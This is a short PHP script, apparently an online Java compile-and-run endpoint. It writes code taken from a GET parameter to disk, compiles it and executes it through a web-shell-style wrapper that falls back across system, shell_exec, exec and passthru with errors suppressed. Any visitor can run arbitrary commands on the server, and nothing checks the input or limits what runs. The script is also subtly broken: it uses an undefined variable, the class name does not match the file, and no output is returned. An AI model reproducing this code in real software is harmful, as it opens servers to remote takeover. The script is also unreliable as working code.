<?php
function exe($c){
	$out = "";
	$c = $c." 2>&1";

	if(is_callable('system')) {
		ob_start();
		@system($c);
		$out = ob_get_contents();
		ob_end_clean();
	}
	if(is_callable('shell_exec')){
		$out = @shell_exec($c);
		
	}
	if(is_callable('exec')) {
		@exec($c,$r);
	}
	if(is_callable('passthru')) {
		ob_start();
		@passthru($c);
		$out = ob_get_contents();
		ob_end_clean();
	}
	return $out;
}

$code = $_GET['code'];
$script = md5(time().rand(0,100));
file_put_contents($script.".java", $code);
if (is_file($script.".java")){
	$res = exe("javac ".$script.".java");
	$res .= exe("java ".$script.$gccoption);
	unlink($script.".class");									
}
?>